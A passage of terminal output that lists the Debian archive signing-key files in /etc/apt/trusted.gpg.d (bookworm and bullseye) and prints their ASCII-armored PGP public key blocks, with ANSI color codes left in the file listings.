0s1mwd/orTk0/IHZpFQ8/0UsG7pmq/tiRP49LV/G4KuDDJvpbMLs6l1b0weFUE/7
kE8TE9mZVGXyjW3m/MGDGEOBsT64HZLsduljYFW5tVTbaVKSKMqSLrhCZxSenzgQ
NlB2T6bKGcYGqL7L
=UUyy
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 11873 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bookworm-security-automatic[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
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
bn5U7DwupeFEycZrqQEKsjwFjLxa
=QzR4
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 461 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bookworm-stable[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
mDMEY865UxYJKwYBBAHaRw8BAQdAd7Z0srwuhlB6JKFkcf4HU4SSS/xcRfwEQWzr
crf6AEq0SURlYmlhbiBTdGFibGUgUmVsZWFzZSBLZXkgKDEyL2Jvb2t3b3JtKSA8
ZGViaWFuLXJlbGVhc2VAbGlzdHMuZGViaWFuLm9yZz6IlgQTFggAPhYhBE1k/sEZ
wgKQZ9bnkfjSWFuHg9SBBQJjzrlTAhsDBQkPCZwABQsJCAcCBhUKCQgLAgQWAgMB
Ah4BAheAAAoJEPjSWFuHg9SBSgwBAP9qpeO5z1s5m4D4z3TcqDo1wez6DNya27QW
WoG/4oBsAQCEN8Z00DXagPHbwrvsY2t9BCsT+PgnSn9biobwX7bDDg==
=5NZE
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 11861 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
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
